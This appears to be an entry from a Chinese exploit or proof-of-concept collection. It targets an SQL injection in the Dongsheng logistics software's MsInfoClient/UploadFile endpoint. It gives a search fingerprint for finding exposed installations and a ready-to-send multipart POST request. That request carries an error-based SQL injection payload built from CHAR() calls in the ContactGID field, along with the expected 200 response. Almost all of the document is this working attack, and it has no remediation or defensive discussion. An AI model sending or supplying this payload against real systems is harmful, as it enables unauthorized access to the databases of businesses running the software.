# 东胜物流软件MsInfoClientUploadFile存在SQL注入漏洞

- **系统**：东胜物流软件　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="CompanysAdapter.aspx"`
- **请求**：`POST /MvcShipping/MsInfoClient/UploadFile HTTP/1.1Host:`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="LoadImage"; filename="test.txt"
Content-Type: application/octet-stream
1234
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="ContactGID";
-1'+(SELECT CHAR(116)+CHAR(110)+CHAR(73)+CHAR(67) WHERE 7096=7096 AND 8843 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (8843=8843) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(107)+CHAR(112)+CHAR(113))))+'
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="SHOWNAME";
1
-----…（脚本共 725 字，完整版见原文）
```
- **预期**：200　|　—